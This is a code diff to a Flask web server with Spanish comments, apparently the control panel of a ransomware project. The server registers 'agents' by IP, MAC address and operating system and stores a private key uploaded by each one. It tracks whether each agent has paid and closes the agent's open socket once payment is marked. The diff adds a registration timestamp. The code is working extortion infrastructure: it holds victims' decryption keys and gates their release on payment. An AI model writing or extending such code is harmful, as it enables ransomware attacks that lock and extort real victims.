@@ -13,8 +13,8 @@ connected_agents = {}  # Diccionario para almacenar las conexiones de agentes ac
 def index():
     conn = get_db_connection()
     c = conn.cursor()
-    c.execute('SELECT id, ip, mac, so, pay_status FROM agents')
-    agents = [{'id': row[0], 'ip': row[1], 'mac': row[2], 'so': row[3], 'pay_status': row[4]} for row in c.fetchall()]
+    c.execute('SELECT id, ip, mac, so, pay_status, timestamp FROM agents')
+    agents = [{'id': row[0], 'ip': row[1], 'mac': row[2], 'so': row[3], 'pay_status': row[4], 'timestamp': row[5]} for row in c.fetchall()]
     conn.close()
     
     return render_template('index.html', agents=agents)
@@ -24,18 +24,19 @@ def register_agent():
     ip = request.form.get('ip')
     mac = request.form.get('mac')
     so = request.form.get('so')
+    timestamp = request.form.get('timestamp')
     private_key_file = request.files.get('private_key')
 
-    if not ip or not mac or not so or not private_key_file:
-        return jsonify({'error': 'Faltan IP, MAC, SO o clave privada'}), 400
+    if not ip or not mac or not so or not timestamp or not private_key_file:
+        return jsonify({'error': 'Faltan IP, MAC, SO, timestamp o clave privada'}), 400
 
     private_key_content = private_key_file.read().decode('utf-8')
 
     # Guardar agente en la base de datos
     conn = get_db_connection()
     c = conn.cursor()
-    c.execute('''INSERT INTO agents (ip, mac, so, private_key) 
-                 VALUES (?, ?, ?, ?)''', (ip, mac, so, private_key_content))
+    c.execute('''INSERT INTO agents (ip, mac, so, private_key, timestamp) 
+                 VALUES (?, ?, ?, ?, ?)''', (ip, mac, so, private_key_content, timestamp))
     agent_id = c.lastrowid  # Recuperar el ID generado automáticamente
     conn.commit()
     conn.close()
@@ -48,9 +49,14 @@ def pay_agent(agent_id):
     c = conn.cursor()
     c.execute("UPDATE agents SET pay_status = TRUE WHERE id = ?", (agent_id,))
     conn.commit()
+    # Si el agente tiene una conexión activa, cerrarla
+    if agent_id in connected_agents:
+        agent_socket = connected_agents.pop(agent_id)
+        agent_socket.close()
+        print(f"Conexión con el agente {agent_id} cerrada tras pago.")
     # Recuperar la lista actualizada de agentes
-    c.execute('SELECT id, ip, mac, so, pay_status FROM agents')
-    agents = [{'id': row[0], 'ip': row[1], 'mac': row[2], 'so': row[3], 'pay_status': row[4]} for row in c.fetchall()]
+    c.execute('SELECT id, ip, mac, so, pay_status, timestamp FROM agents')
+    agents = [{'id': row[0], 'ip': row[1], 'mac': row[2], 'so': row[3], 'pay_status': row[4],'timestamp': row[5]} for row in c.fetchall()]
     conn.close()
 
     return render_template('index.html', agents=agents)
